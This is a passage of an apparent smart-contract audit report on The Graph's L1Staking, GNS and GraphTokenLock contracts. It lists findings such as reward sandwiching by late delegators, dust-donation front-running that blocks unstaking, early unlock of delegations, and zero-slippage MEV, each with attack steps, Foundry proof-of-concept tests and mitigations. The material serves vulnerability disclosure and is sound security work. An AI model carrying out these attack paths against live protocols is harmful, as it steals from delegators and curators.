        _createValidProvision(indexer);
        vm.prank(indexer);
        subgraphService.register(indexer, abi.encode("https://idx.example", "dr5ru", address(0)));

        address allocationId = _newAllocationId("allocation");
        bytes memory proof = _allocationProof(indexer, allocationId);
        vm.prank(indexer);
        subgraphService.startService(indexer, abi.encode(bytes32(uint256(123)), 1000 ether, allocationId, proof));

        uint256 createdEpoch = epochManager.currentEpoch();
        vm.warp(block.timestamp + 1);
        assertEq(epochManager.currentEpoch(), createdEpoch);

        (bool openBefore,,,,,) = subgraphService.getAllocationData(allocationId);
        assertEq(openBefore, true);

        vm.prank(attacker);
        subgraphService.closeStaleAllocation(allocationId);

        (bool openAfter,,,,,) = subgraphService.getAllocationData(allocationId);
        assertEq(openAfter, false);
    }
}

## Suggested Mitigation
In `closeStaleAllocation()` and in `_presentPoi()` condition ordering, enforce allocation maturity before stale handling: load `currentEpoch` and require `currentEpoch > allocation.createdAtEpoch` before allowing forced stale closure. Also add a sensible lower bound for `maxPOIStaleness`, such as at least one epoch duration or another protocol-defined minimum.


## [H-96]. Late delegators can sandwich reward distribution and steal accrued delegation rewards in L1Staking pools

## id: 7RSC0BFXcdj5oyRxWspZQ

## Derived From Pattern/Invariant
RewardCheckpointFreeRiderOrLateJoiner

## Exploit Type
IncentiveMisalignmentOrGameTheory

## Location
StakingExtension via L1Staking proxy.delegate / closeAllocation

## Finding Status: Valid
### Finding Status Justification: The described path exists in in-scope L1Staking/StakingExtension code. StakingExtension._delegate mints shares against the current pool ratio and immediately adds the new delegated tokens and shares. Later Staking._collectDelegationIndexingRewards and _collectDelegationQueryRewards add delegationRewards directly to pool.tokens for the live pool. There is no reward debt, userRewardPerTokenPaid, allocation snapshot, or holding-period guard in the provided code. A permissionless delegator can join a staked indexer before a reward distribution and later redeem shares for a pro-rata part of the added rewards. No complete safeguard or explicit accepted-risk documentation is shown.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
Delegation rewards are credited by increasing the shared pool token balance, while user entitlement is only the caller's current share balance. There is no userRewardPerTokenPaid, rewardDebt, per-allocation snapshot, or minimum holding period, so a delegator can buy shares immediately before a known reward distribution and receive a pro-rata part of rewards accrued before they joined. Vulnerable flow: _delegate mints shares from the current pool ratio with `shares = (pool.tokens == 0) ? delegatedTokens : delegatedTokens.mul(pool.shares).div(pool.tokens); pool.tokens = pool.tokens.add(delegatedTokens); pool.shares = pool.shares.add(shares);`. Later _collectDelegationIndexingRewards credits historical rewards to the same live pool with `delegationRewards = _tokens.sub(indexerCut); pool.tokens = pool.tokens.add(delegationRewards);`. Because rewards are not checkpointed to the delegators that existed during the allocation/reward accrual window, a late joiner captures historical rewards funded for earlier delegators.

## Impact
A permissionless attacker can dilute long-term delegators and extract unearned GRT rewards from protocol-held delegation pools. If large allocations or query-fee rewards are pending, this can cause significant user rewards to be stolen directly from the staking contract.

## Proof of Concept
1. Honest delegators hold shares in an indexer's delegation pool while an allocation accrues rewards. 2. Just before the indexer/operator closes the allocation, or before a collect call that will credit delegation rewards, the attacker delegates a large amount to the same indexer. 3. The attacker receives shares at the pre-reward pool price. 4. The reward distribution increases pool.tokens for all current shares, including the attacker's newly minted shares. 5. The attacker undelegates after the reward is credited and later withdraws principal plus a pro-rata share of rewards that accrued before the attacker joined. 6. Existing delegators receive less than their time-weighted share of the rewards.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";
contract DelegationPoolHarness {
    struct Delegation { uint256 shares; }
    struct Pool { uint256 tokens; uint256 shares; mapping(address => Delegation) delegators; }
    Pool internal pool;
    function delegate(address user, uint256 tokens) external {
        uint256 shares = pool.tokens == 0 ? tokens : tokens * pool.shares / pool.tokens;
        require(shares > 0);
        pool.tokens += tokens;
        pool.shares += shares;
        pool.delegators[user].shares += shares;
    }
    function distributeRewards(uint256 amount) external {
        if (pool.tokens > 0) pool.tokens += amount;
    }
    function position(address user) external view returns (uint256) {
        return pool.delegators[user].shares * pool.tokens / pool.shares;
    }
}
contract RewardFreeRiderPoC is Test {
    function testLateJoinerCapturesHistoricalRewards() public {
        address alice = address(uint160(0xA11CE));
        address attacker = address(uint160(0xBEEF));
        DelegationPoolHarness h = new DelegationPoolHarness();
        h.delegate(alice, 100 ether);
        uint256 aliceBefore = h.position(alice);
        h.delegate(attacker, 900 ether);
        h.distributeRewards(100 ether);
        uint256 attackerValue = h.position(attacker);
        uint256 aliceAfter = h.position(alice);
        assertEq(aliceBefore, 100 ether);
        assertEq(attackerValue, 990 ether);
        assertEq(aliceAfter, 110 ether);
        assertGt(attackerValue, 900 ether);
        assertEq(attackerValue - 900 ether, 90 ether);
    }
}

## Suggested Mitigation
Checkpoint delegation rewards at accrual boundaries. Add per-user reward debt/userRewardPerTokenPaid or snapshot pool shares eligible for each allocation/reward event, and only distribute rewards to delegators that were present during the accrual period. Alternatively enforce a holding/activation delay so newly delegated shares cannot receive already-accrued rewards.


## [M-97]. Permissionless stake donations can front-run and DoS full L1 stake migration or unstake

## id: tM0v7fZVgdvWcCC7BRCAL

## Derived From Pattern/Invariant
MaturityorGatingByPass / front-run state-gate manipulation

## Exploit Type
Dos

## Location
L1Staking.stakeTo / transferStakeToL2

## Finding Status: Valid
### Finding Status Justification: The root cause exists. stakeTo(address,uint256) is public and lets any caller pull their own GRT and add stake to any indexer through _stake. _transferStakeToL2 subtracts the caller-supplied _amount from the live tokensStaked and then requires the remainder to be either zero or at least __minimumIndexerStake. If an indexer submits a full migration amount based on the pre-front-run balance, a dust stakeTo donation can leave a nonzero sub-minimum remainder and revert. The same stale-amount issue applies to unstake's minimum secure-stake check when a donation changes the live balance. This is a permissionless current liveness path, not privileged abuse or user-only mistake.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`stakeTo(address _indexer, uint256 _tokens)` lets any caller add stake to any indexer. Full exit and full L2 migration later rely on the caller-provided `_amount` leaving either exactly zero stake or at least `__minimumIndexerStake`. An attacker can observe an indexer transaction that intends to transfer or unstake its full current balance, front-run it with a 1 wei `stakeTo(indexer, 1)` donation, and force the victim transaction to leave a dust remainder below the minimum stake, reverting the transaction. Vulnerable snippets: `function stakeTo(address _indexer, uint256 _tokens) public override notPartialPaused { require(_tokens > 0, "!tokens"); TokenUtils.pullTokens(graphToken(), msg.sender, _tokens); _stake(_indexer, _tokens); }` and `_transferStakeToL2`: `indexerStake.tokensStaked = indexerStake.tokensStaked.sub(_amount); require(indexerStake.tokensStaked == 0 || indexerStake.tokensStaked >= __minimumIndexerStake, "!minimumIndexerStake remaining");`. The same stale-amount grief applies to inherited `unstake()`, whose documentation explicitly tries to avoid in-flight amount races but only caps when the requested amount exceeds the live balance, not when a front-run donation leaves sub-minimum dust.

## Impact
A permissionless attacker can repeatedly block targeted indexers from fully migrating stake to L2 or fully unstaking by donating minimal GRT immediately before each transaction. This creates a liveness DoS for migration/exit flows and can delay operational migration of large indexers and their dependent delegators. The attacker does not steal funds, so this is a Medium griefing/liveness issue rather than a direct High/Critical fund-loss impact.

## Proof of Concept
1. Indexer has exactly `N` staked GRT and submits `transferStakeToL2(..., _amount=N, ...)` to fully migrate, or `unstake(N)` to fully exit. 2. Attacker sees the transaction in the mempool. 3. Attacker front-runs with `stakeTo(indexer, 1)`, donating 1 wei GRT to the indexer. 4. The victim transaction executes with the stale `_amount=N`; after subtracting, `tokensStaked == 1`, which is nonzero and below `__minimumIndexerStake`. 5. The minimum-remaining-stake check reverts. 6. The attacker can repeat with another dust donation whenever the indexer resubmits.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1StakingDonationModel {
    uint256 public constant minimumIndexerStake = 100 ether;
    mapping(address => uint256) public tokensStaked;

    function stakeTo(address indexer, uint256 tokens) external {
        require(tokens > 0, "!tokens");
        require(tokensStaked[indexer] + tokens >= minimumIndexerStake, "!minimumIndexerStake");
        tokensStaked[indexer] += tokens;
    }

    function transferStakeToL2(uint256 amount) external {
        address indexer = msg.sender;
        require(tokensStaked[indexer] != 0, "tokensStaked == 0");
        tokensStaked[indexer] -= amount;
        require(
            tokensStaked[indexer] == 0 || tokensStaked[indexer] >= minimumIndexerStake,
            "!minimumIndexerStake remaining"
        );
    }

    function unstake(uint256 amount) external {
        address indexer = msg.sender;
        require(tokensStaked[indexer] > 0, "!stake");
        uint256 tokensToLock = amount < tokensStaked[indexer] ? amount : tokensStaked[indexer];
        uint256 newStake = tokensStaked[indexer] - tokensToLock;
        require(newStake == 0 || newStake >= minimumIndexerStake, "!minimumIndexerStake");
        tokensStaked[indexer] = newStake;
    }
}

contract L1StakingDonationDoSTest is Test {
    L1StakingDonationModel staking;
    address indexer = address(0x1111);
    address attacker = address(0xBEEF);

    function setUp() public {
        staking = new L1StakingDonationModel();
        vm.prank(indexer);
        staking.stakeTo(indexer, 100 ether);
    }

    function testDustDonationDoSFullL2Migration() public {
        uint256 amountReadByIndexer = staking.tokensStaked(indexer);
        assertEq(amountReadByIndexer, 100 ether);

        vm.prank(attacker);
        staking.stakeTo(indexer, 1);

        vm.prank(indexer);
        vm.expectRevert("!minimumIndexerStake remaining");
        staking.transferStakeToL2(amountReadByIndexer);

        assertEq(staking.tokensStaked(indexer), 100 ether + 1);
    }

    function testDustDonationDoSFullUnstake() public {
        uint256 amountReadByIndexer = staking.tokensStaked(indexer);
        assertEq(amountReadByIndexer, 100 ether);

        vm.prank(attacker);
        staking.stakeTo(indexer, 1);

        vm.prank(indexer);
        vm.expectRevert("!minimumIndexerStake");
        staking.unstake(amountReadByIndexer);

        assertEq(staking.tokensStaked(indexer), 100 ether + 1);
    }
}


## Suggested Mitigation
Make full-exit and full-migration operations robust to third-party stake donations. For example, support a sentinel amount such as `type(uint256).max` meaning use the live full stake, or when the post-operation remainder is below `__minimumIndexerStake` and there are no allocation/lock constraints, automatically include the dust remainder instead of reverting. Alternatively, restrict third-party `stakeTo` to explicit indexer opt-in or track third-party top-ups separately so they cannot change an indexer's exit/migration gate mid-flight.


## [M-98]. Delegators can bypass the unbonding period after an indexer only partially migrated to L2

## id: _vLiS7aapNC9UBoxSffUM

## Derived From Pattern/Invariant
MaturityorGatingByPass / Temporal invariant QZ3UYuA5NTntKmfMiJQ3_

## Exploit Type
AccountingInvariantViolation

## Location
L1Staking.unlockDelegationToTransferredIndexer

## Finding Status: Valid
### Finding Status Justification: The root cause exists in in-scope L1Staking. _transferStakeToL2 sets indexerTransferredToL2[_indexer] the first time an indexer transfers stake, including partial transfers, and does not separately record full migration. unlockDelegationToTransferredIndexer later requires only indexerTransferredToL2[_indexer] != address(0) and __stakes[_indexer].tokensStaked == 0, then sets the caller's delegation.tokensLockedUntil to the current epoch. The zero-stake condition can be reached after a partial transfer through normal unstake/withdrawal or slashing paths, not necessarily by bridging the remaining stake. No complete safeguard distinguishes full L2 migration from later non-bridge exit. The action is permissionless for affected delegators and current.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`unlockDelegationToTransferredIndexer()` treats any indexer with a nonzero `indexerTransferredToL2` mapping and zero current L1 stake as fully transferred to L2. However, `_transferStakeToL2()` sets `indexerTransferredToL2[_indexer]` on the first transfer, including partial transfers that leave stake on L1. If the indexer later reaches zero L1 stake through ordinary unstaking/withdrawal or slashing instead of transferring all remaining stake to L2, delegators can still force their locked undelegation to mature immediately.

Vulnerable snippet:
```solidity
require(
    indexerTransferredToL2[_indexer] != address(0) && __stakes[_indexer].tokensStaked == 0,
    "indexer not transferred"
);

Delegation storage delegation = __delegationPools[_indexer].delegators[msg.sender];
require(delegation.tokensLocked != 0, "! locked");

delegation.tokensLockedUntil = epochManager().currentEpoch();
```

The predicate does not distinguish a full L2 migration from `partial transfer -> remaining stake exits via non-bridge flow`. This breaks the intended temporal invariant that early unlock is only available when the indexer fully exited L1 by transferring the remaining stake to L2.

## Impact
Delegators can withdraw locked delegation immediately instead of waiting the configured delegation unbonding period. This weakens staking exit guarantees and can let large delegators escape protocol lockup timing after a partially migrated indexer exits L1 through non-bridge paths.

## Proof of Concept
1. An indexer has L1 stake and a delegator has delegated stake.
2. The indexer calls `transferStakeToL2()` for only part of its stake. This sets `indexerTransferredToL2[indexer]` but leaves nonzero L1 stake.
3. The delegator calls `undelegate()`, creating `tokensLocked > 0` and `tokensLockedUntil = currentEpoch + delegationUnbondingPeriod`.
4. The indexer later reduces remaining L1 stake to zero through ordinary unstaking/withdrawal or slashing, not by transferring all remaining stake to L2.
5. The delegator calls `unlockDelegationToTransferredIndexer(indexer)`.
6. The function only checks `indexerTransferredToL2[indexer] != 0` and `tokensStaked == 0`, then sets `tokensLockedUntil` to the current epoch, allowing immediate `withdrawDelegated()`.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

contract L1StakingUnlockBugHarness {
    struct Stake { uint256 tokensStaked; }
    struct Delegation { uint256 tokensLocked; uint256 tokensLockedUntil; }

    mapping(address => address) public indexerTransferredToL2;
    mapping(address => Stake) public stakes;
    mapping(address => mapping(address => Delegation)) public delegations;
    uint256 public currentEpoch = 100;

    function markPartialTransfer(address indexer, address l2Beneficiary, uint256 remainingStake) external {
        require(l2Beneficiary != address(0));
        indexerTransferredToL2[indexer] = l2Beneficiary;
        stakes[indexer].tokensStaked = remainingStake;
    }

    function setStake(address indexer, uint256 stakeAmount) external {
        stakes[indexer].tokensStaked = stakeAmount;
    }

    function lockDelegation(address indexer, address delegator, uint256 amount, uint256 untilEpoch) external {
        delegations[indexer][delegator] = Delegation({tokensLocked: amount, tokensLockedUntil: untilEpoch});
    }

    function unlockDelegationToTransferredIndexer(address indexer) external {
        require(indexerTransferredToL2[indexer] != address(0) && stakes[indexer].tokensStaked == 0, "indexer not transferred");
        Delegation storage delegation = delegations[indexer][msg.sender];
        require(delegation.tokensLocked != 0, "! locked");
        delegation.tokensLockedUntil = currentEpoch;
    }

    function lockedUntil(address indexer, address delegator) external view returns (uint256) {
        return delegations[indexer][delegator].tokensLockedUntil;
    }
}

contract L1StakingUnlockBugTest is Test {
    function testPartialMigrationThenNonBridgeExitAllowsEarlyDelegationUnlock() public {
        L1StakingUnlockBugHarness staking = new L1StakingUnlockBugHarness();
        address indexer = address(0x1001);
        address delegator = address(0x2002);
        address l2Beneficiary = address(0xBEEF);

        staking.markPartialTransfer(indexer, l2Beneficiary, 1_000 ether);
        staking.lockDelegation(indexer, delegator, 500 ether, 130);
        assertGt(staking.lockedUntil(indexer, delegator), staking.currentEpoch());

        staking.setStake(indexer, 0);

        vm.prank(delegator);
        staking.unlockDelegationToTransferredIndexer(indexer);

        assertEq(staking.lockedUntil(indexer, delegator), staking.currentEpoch());
    }
}

## Suggested Mitigation
Track whether the indexer completed a full L2 stake migration inside `_transferStakeToL2()` instead of inferring it from `tokensStaked == 0`. For example, set a dedicated `indexerFullyTransferredToL2[indexer] = true` only when `_transferStakeToL2()` reduces `tokensStaked` to zero, and make `unlockDelegationToTransferredIndexer()` require that flag. Do not allow ordinary unstake/withdraw or slashing paths to satisfy the early-unlock condition.


## [M-99]. Partial L2 stake transfer lets later non-bridge exit unlock delegations early

## id: j1POF82OvPKxWP90AphWq

## Derived From Pattern/Invariant
GlobalParamMidFlowManipulation

## Exploit Type
AccountingInvariantViolation

## Location
L1Staking.unlockDelegationToTransferredIndexer

## Finding Status: Valid
### Finding Status Justification: The described predicate is present exactly in L1Staking.unlockDelegationToTransferredIndexer. The code treats an indexer as transferred when indexerTransferredToL2 is nonzero and current L1 tokensStaked is zero. Because _transferStakeToL2 writes indexerTransferredToL2 on the first transfer before knowing whether all stake is migrated, a partial bridge followed by ordinary exit or slashing can satisfy the unlock predicate. The function then shortens a locked undelegation to the current epoch. There is no latched fully-transferred flag or check that the final reduction to zero occurred through _transferStakeToL2. This is in scope, currently reachable, and does not require privileged compromise.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
`unlockDelegationToTransferredIndexer` treats an indexer as fully migrated whenever `indexerTransferredToL2[_indexer] != address(0)` and `__stakes[_indexer].tokensStaked == 0`. The vulnerable check is: `require(indexerTransferredToL2[_indexer] != address(0) && __stakes[_indexer].tokensStaked == 0, 'indexer not transferred'); ... delegation.tokensLockedUntil = epochManager().currentEpoch();`. This does not prove the indexer's zero L1 stake came from a full L2 migration. An indexer can perform only a partial `transferStakeToL2` to set the migration marker, then later reduce the remaining L1 stake to zero through ordinary unstake/withdraw or slashing. At that point locked delegations can be made withdrawable immediately even though the indexer did not fully migrate remaining stake to L2.

## Impact
Delegators can bypass the configured delegation unbonding period and withdraw locked delegated GRT earlier than intended after an indexer's partial migration plus later non-bridge exit. This weakens withdrawal delay and slashing-exposure assumptions for delegated stake.

## Proof of Concept
1. Indexer has L1 stake and delegators. 2. Indexer performs a partial `transferStakeToL2`, setting `indexerTransferredToL2[indexer]` while keeping some L1 stake. 3. A delegator undelegates and receives locked delegation with `tokensLockedUntil` in a future epoch. 4. The indexer later exits the remaining L1 stake through normal non-bridge flows, making `tokensStaked == 0`. 5. The delegator calls `unlockDelegationToTransferredIndexer`, which shortens `tokensLockedUntil` to the current epoch. 6. The delegator withdraws immediately, bypassing the original unbonding delay.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import 'forge-std/Test.sol';

contract L1StakingUnlockHarness {
    struct Stake { uint256 tokensStaked; }
    struct Delegation { uint256 tokensLocked; uint256 tokensLockedUntil; }
    mapping(address => address) public indexerTransferredToL2;
    mapping(address => Stake) public stakes;
    mapping(address => mapping(address => Delegation)) public delegations;
    uint256 public currentEpoch = 10;

    function partialTransfer(address indexer, address l2, uint256 remainingStake) external {
        indexerTransferredToL2[indexer] = l2;
        stakes[indexer].tokensStaked = remainingStake;
    }

    function nonBridgeExit(address indexer) external {
        stakes[indexer].tokensStaked = 0;
    }

    function setLocked(address indexer, address delegator, uint256 amount, uint256 untilEpoch) external {
        delegations[indexer][delegator] = Delegation(amount, untilEpoch);
    }

    function unlockDelegationToTransferredIndexer(address indexer) external {
        require(indexerTransferredToL2[indexer] != address(0) && stakes[indexer].tokensStaked == 0, 'indexer not transferred');
        Delegation storage d = delegations[indexer][msg.sender];
        require(d.tokensLocked != 0, '! locked');
        d.tokensLockedUntil = currentEpoch;
    }

    function withdrawDelegated(address indexer) external returns (uint256) {
        Delegation storage d = delegations[indexer][msg.sender];
        require(currentEpoch >= d.tokensLockedUntil, 'locked');
        uint256 amount = d.tokensLocked;
        d.tokensLocked = 0;
        d.tokensLockedUntil = 0;
        return amount;
    }

    function lockedUntil(address indexer, address delegator) external view returns (uint256) {
        return delegations[indexer][delegator].tokensLockedUntil;
    }
}

contract PrematureUnlockAfterPartialMigrationTest is Test {
    function testPartialTransferThenNonBridgeExitUnlocksDelegationEarly() public {
        L1StakingUnlockHarness h = new L1StakingUnlockHarness();
        address indexer = address(0xA11CE);
        address delegator = address(0xB0B);
        uint256 futureEpoch = 100;
        h.partialTransfer(indexer, address(0x2222), 100 ether);
        h.setLocked(indexer, delegator, 10 ether, futureEpoch);
        assertGt(futureEpoch, h.currentEpoch());
        h.nonBridgeExit(indexer);
        vm.prank(delegator);
        h.unlockDelegationToTransferredIndexer(indexer);
        assertEq(h.lockedUntil(indexer, delegator), h.currentEpoch());
        vm.prank(delegator);
        uint256 withdrawn = h.withdrawDelegated(indexer);
        assertEq(withdrawn, 10 ether);
    }
}

## Suggested Mitigation
Track whether the final reduction to zero stake happened through `_transferStakeToL2` rather than through any zero-stake state. For example, set a dedicated `indexerFullyTransferredToL2[indexer] = true` only inside `_transferStakeToL2` when the post-transfer stake is zero, and require that flag in `unlockDelegationToTransferredIndexer`.


## [M-100]. Post-revocation surplus lets GraphTokenLock.release over-increment releasedAmount and brick accounting views

## id: lYR8UbIMMGs8m8zLoAVTA

## Derived From Pattern/Invariant
AccountingInvariantViolation: releasedAmount + revokedAmount must never exceed managedAmount

## Exploit Type
AccountingInvariantViolation

## Location
GraphTokenLock.releasableAmount/release

## Finding Status: Valid
### Finding Status Justification: The code omits revokedAmount from releasableAmount. After a normal revoke, extra tokens sent to the wallet can be treated as scheduled releasable balance; release adds that amount to releasedAmount. totalOutstandingAmount later subtracts both releasedAmount and revokedAmount from managedAmount and can underflow. This is in scoped code, has no complete cap safeguard, and is not documented as intentional.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
After revoke(), GraphTokenLock records revokedAmount but releasableAmount only subtracts releasedAmount from availableAmount. Vulnerable snippet: uint256 releasable = availableAmount().sub(releasedAmount); return MathUtils.min(currentBalance(), releasable); releasedAmount = releasedAmount.add(amountToRelease). Because revokedAmount is omitted, later surplus tokens held by the wallet can be counted as scheduled releasable tokens. After a revocation that sets revokedAmount=60 on a 100 token lock, adding 60 surplus tokens and calling release() at the end can set releasedAmount=100 while revokedAmount remains 60. totalOutstandingAmount() then computes managedAmount.sub(releasedAmount).sub(revokedAmount) and underflows/reverts.

## Impact
The lock accounting invariant is permanently broken for the wallet. totalOutstandingAmount() and surplusAmount() can become uncallable, blocking surplus accounting and any integrations that depend on these views after a normal revoke/surplus/release sequence.

## Proof of Concept
1. Create a revocable 100 GRT lock with 10 periods. 2. At 40% vested, owner calls revoke(), setting revokedAmount to 60 and leaving 40 scheduled tokens. 3. Send 60 surplus GRT directly to the wallet. 4. After endTime, beneficiary calls release(). 5. release() transfers 100 and sets releasedAmount=100 while revokedAmount=60. 6. totalOutstandingAmount() underflows because releasedAmount + revokedAmount exceeds managedAmount.

## Proof of Code
pragma solidity ^0.7.3;
import "forge-std/Test.sol";
import "../contracts/GraphTokenLockSimple.sol";
contract MockGRT2 { mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance; function mint(address to,uint256 amount) external { balanceOf[to]+=amount; } function transfer(address to,uint256 amount) external returns(bool){ require(balanceOf[msg.sender]>=amount,'bal'); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; return true; } function approve(address spender,uint256 amount) external returns(bool){ allowance[msg.sender][spender]=amount; return true; } function transferFrom(address from,address to,uint256 amount) external returns(bool){ require(balanceOf[from]>=amount,'bal'); require(allowance[from][msg.sender]>=amount,'allow'); allowance[from][msg.sender]-=amount; balanceOf[from]-=amount; balanceOf[to]+=amount; return true; } }
contract RevokedSurplusPoC is Test { function testRevokedSurplusBreaksOutstandingAccounting() public { MockGRT2 grt = new MockGRT2(); GraphTokenLockSimple lock = new GraphTokenLockSimple(); address beneficiary = address(0xBEEF); uint256 managed = 100 ether; lock.initialize(address(this), beneficiary, address(grt), managed, 1000, 1100, 10, 0, 0, IGraphTokenLock.Revocability.Enabled); grt.mint(address(lock), managed); vm.warp(1040); lock.revoke(); assertEq(lock.revokedAmount(), 60 ether); grt.mint(address(lock), 60 ether); vm.warp(1101); vm.prank(beneficiary); lock.release(); assertEq(lock.releasedAmount(), managed); assertGt(lock.releasedAmount() + lock.revokedAmount(), lock.managedAmount()); vm.expectRevert(); lock.totalOutstandingAmount(); } }

## Suggested Mitigation
Make releasableAmount respect revokedAmount by capping to totalOutstandingAmount or managedAmount - releasedAmount - revokedAmount. For example, compute scheduledOutstanding = managedAmount.sub(releasedAmount).sub(revokedAmount) and return min(currentBalance(), min(availableAmount.sub(releasedAmount), scheduledOutstanding)).


## [H-101]. Zero-slippage curation rollover in GNS.publishNewVersion lets MEV extract curator value during upgrades

## id: cU-ypYxVo_gtLnb-Qkh8S

## Derived From Pattern/Invariant
SlippageMissingOrInsufficient

## Exploit Type
SlippageMissingOrInsufficient

## Location
GNS inherited by L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: L1GNS inherits the in-scope GNS.publishNewVersion implementation. The function performs the claimed rollover using curation.burn(oldDeployment, vSignal, 0) and curation.mint(newDeployment, tokensWithTax, 0), with no owner-supplied minimums or deadline. The path is reachable for active subgraphs with nonzero nSignal. Public curation trading can affect execution-time outputs, and there is no complete on-chain safeguard against accepting a worse old-deployment burn price. The issue does not depend on governance abuse, leaked credentials, or future integrations.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
L1GNS inherits GNS.publishNewVersion(). When a subgraph owner upgrades to a new deployment, the function burns all old deployment vSignal and mints new deployment vSignal with minimum outputs hardcoded to zero. Vulnerable snippet: uint256 tokens = curation.burn(subgraphData.subgraphDeploymentID, subgraphData.vSignal, 0); ... (subgraphData.vSignal, ) = curation.mint(_subgraphDeploymentID, tokensWithTax, 0);. There is no owner-supplied minimum tokensOut, minimum vSignalOut, or deadline, so a mempool actor can trade around the old curation curve before the upgrade and force the rollover to execute at a worse price instead of reverting.

## Impact
A profitable MEV/economic attack can extract GRT value from existing curators during large subgraph upgrades. If the affected subgraph has more than $1M of curated value, the loss can satisfy the program's High economic-loss impact.

## Proof of Concept
1. A valuable subgraph has large nSignal/vSignal backed by GRT in the old deployment. 2. The owner submits publishNewVersion(oldSubgraph, newDeployment). The calldata reveals the target and the transaction accepts any burn/mint output because both minOut arguments are zero. 3. An attacker front-runs by trading against the old deployment curve to worsen the burn price. 4. The owner's transaction executes and rolls all curator value through the manipulated price instead of reverting. 5. The attacker back-runs to close the position, keeping the value extracted from the curators' rolled-over curation position.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    mapping(bytes32 => bool) public curated;
    mapping(bytes32 => uint256) public bps;
    function seed(bytes32 id, uint256 priceBps) external { curated[id] = true; bps[id] = priceBps; }
    function setBps(bytes32 id, uint256 priceBps) external { bps[id] = priceBps; }
    function isCurated(bytes32 id) external view returns (bool) { return curated[id]; }
    function burn(bytes32 id, uint256 amount, uint256 minOut) external returns (uint256) { uint256 out = amount * bps[id] / 10000; require(out >= minOut, "min"); return out; }
    function mint(bytes32 id, uint256 tokens, uint256 minOut) external returns (uint256, uint256) { uint256 out = tokens * 10000 / bps[id]; require(out >= minOut, "min"); curated[id] = true; return (out, 0); }
}

contract GNSHarness {
    MockCuration public c;
    bytes32 public dep;
    uint256 public vSignal = 1_000_000 ether;
    uint256 public nSignal = 1_000_000 ether;
    address public owner;
    constructor(MockCuration c_, bytes32 oldDep) { c = c_; dep = oldDep; owner = msg.sender; }
    function publishNewVersion(bytes32 newDep) external { require(msg.sender == owner, "auth"); require(!c.isCurated(newDep), "precurated"); if (nSignal != 0) { uint256 tokens = c.burn(dep, vSignal, 0); (vSignal,) = c.mint(newDep, tokens, 0); } dep = newDep; }
}

contract PublishNewVersionSlippageTest is Test {
    bytes32 constant OLD = keccak256("old");
    bytes32 constant NEW = keccak256("new");
    function testZeroMinAcceptsManipulatedBurnPrice() public { MockCuration c = new MockCuration(); c.seed(OLD, 10000); c.setBps(NEW, 10000); GNSHarness h = new GNSHarness(c, OLD); c.setBps(OLD, 1000); h.publishNewVersion(NEW); assertEq(h.vSignal(), 100_000 ether); assertLt(h.vSignal(), 1_000_000 ether); }
}

## Suggested Mitigation
Extend publishNewVersion with caller-specified minimum tokensOut and minimum vSignalOut, plus a deadline. Pass those values to curation.burn and curation.mint instead of zero, and revert when the rollover cannot meet the owner's bounded execution price.


## [M-102]. Pre-curation front-run permanently blocks GNS.publishNewVersion for the owner's target deployment

## id: m9HcS0JWZ5HI883rmR4iX

## Derived From Pattern/Invariant
FrontrunMev

## Exploit Type
FrontrunMev

## Location
GNS inherited by L1GNS.publishNewVersion

## Finding Status: Valid
### Finding Status Justification: The exact require exists in GNS.publishNewVersion, which L1GNS inherits: the target deployment must not already be curated. Since the target deployment ID is public calldata and curation is permissionless, a third party can make isCurated true before the owner transaction or before retries. The function then reverts for that deployment. The code contains no reservation, snapshot, commit-reveal, or exception for owner upgrades. The comment documents a different intended protection, not an explicit acceptance of this third-party DoS risk.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
publishNewVersion rejects any target deployment that is already curated: require(!curation.isCurated(_subgraphDeploymentID), "GNS: Owner cannot point to a subgraphID that has been pre-curated");. Because the target deployment ID is visible in the owner's pending transaction, any address can front-run by minting dust curation signal for that deployment. As long as the attacker leaves the deployment curated, all later owner attempts to publish that exact deployment revert.

## Impact
A permissionless actor can block a subgraph owner from upgrading the on-chain name to the intended deployment. This is a functional DoS of subgraph version upgrades and can keep users and curators pinned to stale subgraph deployments.

## Proof of Concept
1. The owner prepares publishNewVersion(subgraphID, newDeployment). 2. A mempool searcher sees newDeployment in calldata. 3. The searcher front-runs by curating newDeployment with a dust amount. 4. The owner's transaction reaches require(!curation.isCurated(newDeployment)) and reverts. 5. The attacker keeps dust signal in the deployment, so repeated attempts to publish the same deployment continue to revert.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

contract MockCuration {
    mapping(bytes32 => bool) public curated;
    mapping(bytes32 => uint256) public bps;
    function seed(bytes32 id, uint256 priceBps) external { curated[id] = true; bps[id] = priceBps; }
    function setBps(bytes32 id, uint256 priceBps) external { bps[id] = priceBps; }
    function isCurated(bytes32 id) external view returns (bool) { return curated[id]; }
    function burn(bytes32 id, uint256 amount, uint256 minOut) external returns (uint256) { uint256 out = amount * bps[id] / 10000; require(out >= minOut, "min"); return out; }
    function mint(bytes32 id, uint256 tokens, uint256 minOut) external returns (uint256, uint256) { uint256 out = tokens * 10000 / bps[id]; require(out >= minOut, "min"); curated[id] = true; return (out, 0); }
}

contract GNSHarness {
    MockCuration public c;
    bytes32 public dep;
    uint256 public vSignal = 1_000_000 ether;
    uint256 public nSignal = 1_000_000 ether;
    address public owner;
    constructor(MockCuration c_, bytes32 oldDep) { c = c_; dep = oldDep; owner = msg.sender; }
